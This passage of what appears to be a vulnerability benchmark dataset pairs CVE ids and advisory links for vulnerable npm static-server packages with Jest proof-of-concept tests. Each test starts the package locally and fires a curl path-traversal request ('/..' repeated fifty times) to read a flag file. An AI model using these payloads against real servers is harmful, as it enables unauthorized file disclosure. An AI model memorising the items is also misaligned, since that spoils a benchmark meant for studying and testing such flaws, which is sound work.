  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:wangshuai:20170910; 
path-traversal,CVE-2017-16103,serveryztyzt,1.4.0,n/a,path-traversal/serveryztyzt_1.4.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9987/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serveryztyzt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9987/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serveryztyzt/node.js"";
  server_process = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9987${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:5:8,https://security.snyk.io/vuln/npm:serveryztyzt:20170516; https://github.com/advisories/GHSA-q4cq-539c-3mmm
path-traversal,CVE-2020-7686,rollup-plugin-dev-server,0.4.3,n/a,path-traversal/rollup-plugin-dev-server_0.4.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rollup-plugin-dev-server"", (done) => {
  expect.assertions(1);
  const server = require(""rollup-plugin-dev-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 10001/tcp"", () => {});
  } catch (e) {}
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:10001${genstr()}""`;
  server({
    host: ""localhost"",
    port: 10001,
  });
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,dist/index.cjs.js:128:6,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINDEVSERVER-590124; https://github.com/advisories/GHSA-vr98-27qj-3c8q
path-traversal,CVE-2018-3734,stattic,0.2.3,0.3.0,path-traversal/stattic_0.2.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in stattic"", (done) => {
  expect.assertions(1);
  const stattic = require(""stattic"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8977/tcp"", () => {});
  } catch (e) {}
  stattic.set(""folder"", ""."");
  stattic.set(""port"", 8977);
  stattic.listen();
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8977${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:117:23,https://security.snyk.io/vuln/npm:stattic:20180307; https://github.com/advisories/GHSA-w4pv-w56c-mg4v
path-traversal,CVE-2017-0930,augustine,0.2.3,n/a,path-traversal/augustine_0.2.3,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8968/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in augustine"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8968/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/augustine/bin/augustine.js -p 8968"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8968${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:88:16,https://security.snyk.io/vuln/npm:augustine:20180123; https://github.com/advisories/GHSA-4wch-fwmx-cf47
path-traversal,CVE-2020-7684,rollup-plugin-serve,0.4.2,n/a,path-traversal/rollup-plugin-serve-favicon_0.4.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in  rollup-plugin-serve-favicon"", (done) => {
  expect.assertions(1);
  const server = require(""rollup-plugin-serve"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  server({
    host: ""localhost"",
    port: 9000,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,dist/index.cjs.js:111:6,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINSERVEFAVICON-585950; 
path-traversal,CVE-2017-16130,exxxxxxxxxxx,1.0.2,n/a,path-traversal/exxxxxxxxxxx_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in exxxxxxxxxxx"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/exxxxxxxxxxx/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/res.js:38:37,https://security.snyk.io/vuln/npm:exxxxxxxxxxx:20170510; https://github.com/advisories/GHSA-pq5x-rprq-8jrj
path-traversal,CVE-2017-16167,yyooopack,3.0.0,n/a,path-traversal/yyooopack_3.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yyooopack"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yyooopack/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:5:8,https://security.snyk.io/vuln/npm:yyooopack:20170516; https://github.com/advisories/GHSA-c3h5-qchh-46hh
path-traversal,,lzl123,1.1.0,n/a,path-traversal/lzl123_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in lzl123"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/lzl123/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:8:8,https://security.snyk.io/vuln/npm:lzl123:20170730; 
path-traversal,,public,0.1.2,0.1.3,path-traversal/public_0.1.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in public"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/public/bin/public"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    console.log(stdout);
    expect(out).toBe(true);
    done();
  });
});
",https://github.com/tnantoka/public/commit/eae8ad8017b260f8667ded5e12801bd72b877af2,bin/public:78:8,https://security.snyk.io/vuln/SNYK-JS-PUBLIC-460390; https://github.com/advisories/GHSA-rwv8-jvff-jq28
path-traversal,CVE-2017-16096,serveryaozeyan,1.0.4,n/a,path-traversal/serveryaozeyan_1.0.4,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serveryaozeyan"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serveryaozeyan/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:serveryaozeyan:20170504; https://github.com/advisories/GHSA-gqfv-g9f6-3v3m
path-traversal,,willvdb_test_server,0.0.0,n/a,path-traversal/willvdb_test_server_0.0.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in willvdb_test_server"", (done) => {
  expect.assertions(1);
  const pkg = require(""willvdb_test_server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8973/tcp"", () => {});
  } catch (e) {}
  pkg.run(8973, __dirname);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8973${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,cityserver.js:57:10,https://security.snyk.io/vuln/npm:willvdb_test_server:20180226; 
path-traversal,,ljjnodeserve,1.0.0,n/a,path-traversal/ljjnodeserve_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ljjnodeserve"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ljjnodeserve/index.js "";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",n/a,index.js:23:12,https://security.snyk.io/vuln/npm:ljjnodeserve:20171006; 
path-traversal,CVE-2017-16161,shenliru,1.2.0,n/a,path-traversal/shenliru_1.2.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in shenliru"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/shenliru/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:shenliru:20170612; https://github.com/advisories/GHSA-f2rc-6xjq-95gq
path-traversal,,nodejsccc,1.0.0,n/a,path-traversal/nodejsccc_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in nodejsccc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/nodejsccc/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:22:8,https://security.snyk.io/vuln/npm:nodejsccc:20180315; 
path-traversal,,shenliru3,1.3.0,n/a,path-traversal/shenliru3_1.3.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in shenliru3"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/shenliru3/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:shenliru3:20180306; 
path-traversal,,asset-cache,0.0.6,n/a,path-traversal/asset-cache_0.0.6,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in asset-cache"", (done) => {
  expect.assertions(1);
  const pkg = require(""asset-cache"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  pkg.listen(9000, function () {});
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/asset-cache.js:31:8,https://security.snyk.io/vuln/npm:asset-cache:20180226; 
path-traversal,CVE-2017-16125,rtcmulticonnection-client,1.0.5,n/a,path-traversal/rtcmulticonnection-client_1.0.5,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rtcmulticonnection-client"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/rtcmulticonnection-client/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:30:12,https://security.snyk.io/vuln/npm:rtcmulticonnection-client:20170425; https://github.com/advisories/GHSA-vcqg-cmv3-wj57
path-traversal,,cxy,1.1.0,n/a,path-traversal/cxy_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8081/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cxy"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8081/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/cxy/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8081${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:cxy:20170730; 
path-traversal,,servergmf,1.1.0,n/a,path-traversal/servergmf_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in servergmf"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/servergmf/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:servergmf:20170730; 
path-traversal,CVE-2018-3715,glance,3.0.0,3.0.4,path-traversal/glance_3.0.0,"const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in glance"", (done) => {
  expect.assertions(1);
  const http = require(""http"");
  const glance = require(""glance"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 5309/tcp"", () => {});
  } catch (e) {}
  var g = glance({
    dir: ""./"",
    port: 8969,
    indices: [],
    hideindex: true,
    nodot: true,
    verbose: true,
  });
  http
    .createServer(function (req, res) {
      if (/^\/static\//.test(req.url)) {
        return g.serveRequest(req, res);
      }
    })
    .listen(5309);
  g.start();
  g.on(""read"", function (req) {
    console.dir(req);
  });
  g.on(""error"", function (req) {
    console.log(""BAD!!!!"");
    g.stop();
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8969${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/jarofghosts/glance/commit/8cfd88e44ebd3f07e3a2eaf376a3e758b6c4ca19,index.js:81:14,https://security.snyk.io/vuln/npm:glance:20180129; https://github.com/advisories/GHSA-2x4q-6jfv-8h9h
path-traversal,CVE-2017-16191,cypserver,1.0.0,n/a,path-traversal/cypserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cypserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/cypserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:10:8,https://security.snyk.io/vuln/npm:cypserver:20170617; https://github.com/advisories/GHSA-m69q-pmxg-vqch
path-traversal,CVE-2019-5480,statichttpserver,0.9.7,n/a,path-traversal/statichttpserver_0.9.7,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in statichttpserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/statichttpserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/middleware/respond.js:28:7,https://security.snyk.io/vuln/SNYK-JS-STATICHTTPSERVER-460284; https://github.com/advisories/GHSA-2j5x-56p6-hj6x
path-traversal,,web-node-server,0.1.0,0.0.11,path-traversal/web-node-server_0.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8981/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in web-node-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8981/tcp"", () => {});
  } catch (e) {}
  let config = {
    localhost: {
      backend: __dirname + ""/"",
      frondend: __dirname + ""/"",
      baseTemp: ""index.html"",
    },
  };
  const pkg = require(""web-node-server"");
  pkg.start(config);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9999${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,nodeserver.js:85:16,https://security.snyk.io/vuln/npm:web-node-server:20180306; 
path-traversal,,ex-http-frame,1.0.2,n/a,path-traversal/ex-http-frame_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ex-http-frame"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ex-http-frame/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/res.js:41:37,https://security.snyk.io/vuln/npm:ex-http-frame:20180226; 
path-traversal,CVE-2017-16102,serverhuwenhui,1.1.0,n/a,path-traversal/serverhuwenhui_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 55555/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverhuwenhui"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 55555/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverhuwenhui/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:55555${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:5:8,https://security.snyk.io/vuln/npm:serverhuwenhui:20170516; https://github.com/advisories/GHSA-rx32-c25r-79mx
path-traversal,,yxxserver,1.0.0,n/a,path-traversal/yxxserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yxxserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yxxserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:yxxserver:20180306; 
path-traversal,CVE-2017-16105,serverwzl,1.3.1,n/a,path-traversal/serverwzl_1.3.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverwzl"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
